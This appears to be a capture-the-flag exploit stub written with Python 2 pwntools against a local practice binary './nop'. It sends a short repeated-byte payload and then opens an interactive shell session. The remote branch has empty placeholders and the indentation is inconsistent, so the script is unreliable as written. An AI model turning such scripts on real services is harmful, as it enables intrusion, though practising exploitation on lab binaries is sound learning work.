#!/usr/bin/python
from pwn import *

context(terminal = ['xterm', 'splitw'])
#context.terminal = ['tmux', 'splitw', '-h']
local = True
if local:
	p = process('./nop')
        gdb.attach(p)
else:
	libc = ELF()
	p = remote()

payload = '\x72\x09'*10

print p.recv(timeout = 1)

p.sendline(payload+'\x00\x00')

p.interactive()
